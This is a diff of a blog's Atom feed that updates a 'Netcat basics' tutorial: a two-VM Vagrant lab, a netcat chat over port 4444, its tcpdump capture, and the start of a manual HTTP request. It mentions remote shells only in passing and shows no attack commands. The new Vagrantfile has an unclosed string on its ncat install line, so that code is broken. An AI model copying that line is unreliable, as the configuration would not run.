@@ -1,43 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>jclariviere</title><link href="https://blog.jclariviere.com/" rel="alternate"></link><link href="https://blog.jclariviere.com/feeds/all.atom.xml" rel="self"></link><id>https://blog.jclariviere.com/</id><updated>2016-01-26T00:00:00-05:00</updated><entry><title>Netcat basics</title><link href="https://blog.jclariviere.com/posts/netcat-basics" rel="alternate"></link><updated>2016-01-26T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:blog.jclariviere.com,2016-01-26:posts/netcat-basics</id><summary type="html">&lt;h2 id="what-is-netcat"&gt;What is netcat?&lt;/h2&gt;
-&lt;p&gt;From the manpage:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning and deal with both IPv4 and IPv6.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;It is referred as the TCP/IP swiss army knife, and is most commonly used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).&lt;/p&gt;
-&lt;h2 id="setup"&gt;Setup&lt;/h2&gt;
-&lt;p&gt;To test the connection between 2 machines, I will use Vagrant to create 2 virtual machines. Vagrant is very simple to use, see &lt;a href="https://blog.jclariviere.com/posts/virtual-machines-with-vagrant"&gt;this post&lt;/a&gt; for the basics.&lt;/p&gt;
-&lt;figure class='code'&gt;
-&lt;figcaption&gt;&lt;span&gt;Vagrantfile&lt;/span&gt; &lt;a href='/code/vagrantfile-netcat/Vagrantfile'&gt;download&lt;/a&gt;&lt;/figcaption&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>jclariviere</title><link href="https://jclariviere.com/" rel="alternate"></link><link href="https://jclariviere.com/feeds/all.atom.xml" rel="self"></link><id>https://jclariviere.com/</id><updated>2024-12-19T00:00:00-05:00</updated><subtitle>Developer | Cybersecurity | DevOps</subtitle><entry><title>Netcat basics</title><link href="https://jclariviere.com/blog/post/netcat-basics/" rel="alternate"></link><published>2016-01-26T00:00:00-05:00</published><updated>2024-12-19T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:jclariviere.com,2016-01-26:/blog/post/netcat-basics/</id><summary type="html">&lt;p&gt;Netcat is known as the TCP/IP swiss army knife. It's often used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
+It can also work with UDP, do port scanning and even be used to execute &lt;a href="https://en.wikipedia.org/wiki/Shell_shoveling"&gt;remote shells&lt;/a&gt;.
+It's a commonly used …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Netcat is known as the TCP/IP swiss army knife. It's often used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
+It can also work with UDP, do port scanning and even be used to execute &lt;a href="https://en.wikipedia.org/wiki/Shell_shoveling"&gt;remote shells&lt;/a&gt;.
+It's a commonly used tool in &lt;a href="https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)"&gt;CTFs&lt;/a&gt; and cybersecurity in general.&lt;/p&gt;
+&lt;p&gt;This post will cover the basic usage.&lt;/p&gt;
+&lt;h2 id="testing-setup"&gt;Testing setup&lt;/h2&gt;
+&lt;p&gt;To test the connection between 2 machines, we will use Vagrant to create 2 virtual machines. Vagrant is very simple to use, see &lt;a href="https://jclariviere.com/blog/post/virtual-machines-with-vagrant/"&gt;this post&lt;/a&gt; for the basics.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;span class="filename"&gt;Vagrantfile&lt;/span&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"2"&lt;/span&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# -*- mode: ruby -*-&lt;/span&gt;
-&lt;span class="c1"&gt;# vi: set ft=ruby :&lt;/span&gt;
+&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"kalilinux/rolling"&lt;/span&gt;
 
-&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"alice"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"alice"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"192.168.33.210"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"shell"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"echo 192.168.33.211 bob &amp;gt;&amp;gt; /etc/hosts"&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
 
-&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ubuntu/trusty64&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"bob"&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"bob"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"192.168.33.211"&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"shell"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"echo 192.168.33.210 alice &amp;gt;&amp;gt; /etc/hosts"&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
 
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;alice&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-    &lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;alice&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.33.210&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo 192.168.33.211 bob &amp;gt;&amp;gt; /etc/hosts&amp;quot;&lt;/span&gt;
-  &lt;span class="k"&gt;end&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"shell"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"apt-get update &amp;amp;&amp;amp; apt-get install -y ncat&lt;/span&gt;
+&lt;span class="s2"&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bob&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-    &lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bob&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.33.211&amp;quot;&lt;/span&gt;
-    &lt;span class="n"&gt;bob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;echo 192.168.33.210 alice &amp;gt;&amp;gt; /etc/hosts&amp;quot;&lt;/span&gt;
-  &lt;span class="k"&gt;end&lt;/span&gt;
-
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;apt-get update &amp;amp;&amp;amp; apt-get install -y nmap&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# to install ncat&lt;/span&gt;
-&lt;span class="k"&gt;end&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;/figure&gt;
-
-&lt;p&gt;Put this &lt;code&gt;Vagrantfile&lt;/code&gt; in a new folder, use &lt;code&gt;vagrant up&lt;/code&gt; to create the VMs then in 2 separate command prompts, use &lt;code&gt;vagrant ssh alice&lt;/code&gt; and &lt;code&gt;vagrant ssh bob&lt;/code&gt; to SSH into them.&lt;/p&gt;
+&lt;p&gt;Put this &lt;code&gt;Vagrantfile&lt;/code&gt; in a new folder and use &lt;code&gt;vagrant up&lt;/code&gt; to create the VMs.
+Then in 2 separate command prompts, use &lt;code&gt;vagrant ssh alice&lt;/code&gt; and &lt;code&gt;vagrant ssh bob&lt;/code&gt; to SSH into them.&lt;/p&gt;
 &lt;h2 id="basic-chat"&gt;Basic chat&lt;/h2&gt;
 &lt;p&gt;To see what netcat does, we will do a very basic chat.
 We'll simply connect the two machines, send hello messages from both sides then kill the connection (with &lt;code&gt;&amp;lt;Ctrl-C&amp;gt;&lt;/code&gt;).&lt;/p&gt;
@@ -45,58 +37,56 @@ We'll simply connect the two machines, send hello messages from both sides then 
 Note that the "client" and "server" terms are only used for the connection setup.
 Once the connection is established, both sides can send and receive data.&lt;/p&gt;
 &lt;h3 id="server"&gt;Server&lt;/h3&gt;
-&lt;p&gt;To listen on a port: &lt;code&gt;nc -l port&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@alice:~$ nc -l 4444
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;To listen on a port: &lt;code&gt;nc -l -p &amp;lt;port&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-l&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id="client"&gt;Client&lt;/h3&gt;
-&lt;p&gt;To connect to a TCP port: &lt;code&gt;nc destination port&lt;/code&gt;. Destination can be an IP address or a DNS name. In our case, &lt;code&gt;alice&lt;/code&gt; is in the &lt;code&gt;hosts&lt;/code&gt; file.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@bob:~$ nc alice 4444
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;To connect to a TCP port: &lt;code&gt;nc &amp;lt;destination&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;.
+Destination can be an IP address or a DNS name.
+In our case, &lt;code&gt;alice&lt;/code&gt; was added to &lt;code&gt;/etc/hosts&lt;/code&gt; in the &lt;code&gt;Vagrantfile&lt;/code&gt; above.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id="output"&gt;Output&lt;/h3&gt;
 &lt;p&gt;Here is the output from both machines.
-The &lt;code&gt;-v&lt;/code&gt; option is for &lt;code&gt;verbose&lt;/code&gt;, which shows the "connection accepted/succeeded" message.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@alice:~$ nc -vl 4444
-Listening on [0.0.0.0] (family 0, port 4444)
-Connection from [192.168.33.211] port 4444 [tcp/*] accepted (family 2, sport 41025)
-&lt;span class="hll"&gt;Hello from alice!
-&lt;/span&gt;Hello from bob!
-&lt;/pre&gt;&lt;/div&gt;
+The &lt;code&gt;-v&lt;/code&gt; option is for &lt;code&gt;verbose&lt;/code&gt;, which shows the "listening on" and "connect to/from" messages.
+The &lt;code&gt;-n&lt;/code&gt; option tells netcat to skip the reverse DNS lookup.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41025&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@bob:~$ nc -v alice 4444
-Connection to alice 4444 port [tcp/*] succeeded!
-Hello from alice!
-&lt;span class="hll"&gt;Hello from bob!
-&lt;/span&gt;&lt;span class="hll"&gt;&amp;lt;Ctrl-C&amp;gt;
-&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;&amp;lt;Ctrl-C&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;The highlighted lines are input sent from the prompt. As you can see, both sides can send and receive.&lt;/p&gt;
 &lt;h3 id="packets"&gt;Packets&lt;/h3&gt;
 &lt;p&gt;Here is the full conversation as captured by tcpdump (I grouped the packets so it's easier to follow).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@alice:~$ sudo tcpdump -i eth1 -ttttt port 4444
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;tcpdump&lt;span class="w"&gt; &lt;/span&gt;-i&lt;span class="w"&gt; &lt;/span&gt;eth1&lt;span class="w"&gt; &lt;/span&gt;-ttttt&lt;span class="w"&gt; &lt;/span&gt;port&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;tcpdump: verbose output suppressed, use -v or -vv for full protocol decode&lt;/span&gt;
+&lt;span class="go"&gt;listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes&lt;/span&gt;
 
-00:00:00.000000 IP bob.41025 &amp;gt; alice.4444: Flags [S], seq 572573479, win 29200, options [mss 1460,sackOK,TS val 4294936802 ecr 0,nop,wscale 6], length 0
-00:00:00.000029 IP alice.4444 &amp;gt; bob.41025: Flags [S.], seq 2846467502, ack 572573480, win 28960, options [mss 1460,sackOK,TS val 4294952445 ecr 4294936802,nop,wscale 6], length 0
-00:00:00.000120 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 1, win 457, options [nop,nop,TS val 4294936802 ecr 4294952445], length 0
+&lt;span class="go"&gt;00:00:00.000000 IP bob.41025 &amp;gt; alice.4444: Flags [S], seq 572573479, win 29200, options [mss 1460,sackOK,TS val 4294936802 ecr 0,nop,wscale 6], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:00.000029 IP alice.4444 &amp;gt; bob.41025: Flags [S.], seq 2846467502, ack 572573480, win 28960, options [mss 1460,sackOK,TS val 4294952445 ecr 4294936802,nop,wscale 6], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:00.000120 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 1, win 457, options [nop,nop,TS val 4294936802 ecr 4294952445], length 0&lt;/span&gt;
 
-00:00:06.248799 IP alice.4444 &amp;gt; bob.41025: Flags [P.], seq 1:19, ack 1, win 453, options [nop,nop,TS val 4294954007 ecr 4294936802], length 18
-00:00:06.249013 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 19, win 457, options [nop,nop,TS val 4294938364 ecr 4294954007], length 0
+&lt;span class="go"&gt;00:00:06.248799 IP alice.4444 &amp;gt; bob.41025: Flags [P.], seq 1:19, ack 1, win 453, options [nop,nop,TS val 4294954007 ecr 4294936802], length 18&lt;/span&gt;
+&lt;span class="go"&gt;00:00:06.249013 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 19, win 457, options [nop,nop,TS val 4294938364 ecr 4294954007], length 0&lt;/span&gt;
 
-00:00:09.239254 IP bob.41025 &amp;gt; alice.4444: Flags [P.], seq 1:17, ack 19, win 457, options [nop,nop,TS val 4294939111 ecr 4294954007], length 16
-00:00:09.239285 IP alice.4444 &amp;gt; bob.41025: Flags [.], ack 17, win 453, options [nop,nop,TS val 4294954754 ecr 4294939111], length 0
+&lt;span class="go"&gt;00:00:09.239254 IP bob.41025 &amp;gt; alice.4444: Flags [P.], seq 1:17, ack 19, win 457, options [nop,nop,TS val 4294939111 ecr 4294954007], length 16&lt;/span&gt;
+&lt;span class="go"&gt;00:00:09.239285 IP alice.4444 &amp;gt; bob.41025: Flags [.], ack 17, win 453, options [nop,nop,TS val 4294954754 ecr 4294939111], length 0&lt;/span&gt;
 
-00:00:12.288043 IP bob.41025 &amp;gt; alice.4444: Flags [F.], seq 17, ack 19, win 457, options [nop,nop,TS val 4294939873 ecr 4294954754], length 0
-00:00:12.288146 IP alice.4444 &amp;gt; bob.41025: Flags [F.], seq 19, ack 18, win 453, options [nop,nop,TS val 4294955517 ecr 4294939873], length 0
-00:00:12.288380 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 20, win 457, options [nop,nop,TS val 4294939873 ecr 4294955517], length 0
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="go"&gt;00:00:12.288043 IP bob.41025 &amp;gt; alice.4444: Flags [F.], seq 17, ack 19, win 457, options [nop,nop,TS val 4294939873 ecr 4294954754], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:12.288146 IP alice.4444 &amp;gt; bob.41025: Flags [F.], seq 19, ack 18, win 453, options [nop,nop,TS val 4294955517 ecr 4294939873], length 0&lt;/span&gt;
+&lt;span class="go"&gt;00:00:12.288380 IP bob.41025 &amp;gt; alice.4444: Flags [.], ack 20, win 457, options [nop,nop,TS val 4294939873 ecr 4294955517], length 0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;ul&gt;
 &lt;li&gt;First 3 packets: standard tcp 3-way handshake (SYN, SYN-ACK, ACK).&lt;/li&gt;
@@ -108,419 +98,265 @@ listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
 &lt;p&gt;Here are some interesting usages of netcat.&lt;/p&gt;
 &lt;h3 id="connecting-to-a-web-server"&gt;Connecting to a web server&lt;/h3&gt;
 &lt;p&gt;Simply connect to the web server on port 80. You can then do a manual HTTP request.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ nc -Cv perdu.com 80
-Connection to perdu.com 80 port [tcp/http] succeeded!
-&lt;span class="hll"&gt;GET / HTTP/1.1
-&lt;/span&gt;&lt;span class="hll"&gt;Host: perdu.com
